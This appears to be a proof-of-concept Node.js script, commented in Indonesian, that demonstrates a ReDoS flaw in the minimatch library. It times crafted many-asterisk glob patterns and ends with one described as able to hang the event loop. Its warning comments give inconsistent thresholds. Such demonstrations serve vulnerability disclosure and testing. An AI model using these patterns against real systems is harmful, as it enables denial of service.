const { minimatch } = require('minimatch');

function runTest(n) {
    // Pola "Jahat": n buah tanda bintang diikuti huruf 'X'
    const pattern = "*".repeat(n) + "X";
    
    // String uji: hanya kumpulan huruf 'a' (tidak ada 'X')
    const testString = "a".repeat(30);

    console.log(`\n--- Menjalankan Test dengan ${n} tanda bintang ---`);
    console.log(`Pattern: ${pattern}`);
    
    const start = Date.now();
    
    // Proses matching dimulai
    const result = minimatch(testString, pattern);
    
    const end = Date.now();
    console.log(`Hasil Match: ${result}`);
    console.log(`Waktu Eksekusi: ${end - start} ms`);
}

// Case 1: Masih aman (Cepat)
runTest(10);

// Case 2: Mulai terasa berat (~1-2 detik)
runTest(15);

// Case 3: "The Killer" (Bisa bikin laptop hang sejenak)
// PERINGATAN: N=34 akan mengunci event loop Node.js selamanya.
console.log("\nPERINGATAN: N=25 akan memakan waktu cukup lama...");
runTest(50);

// jalankan dengan ini node poc-redos.js
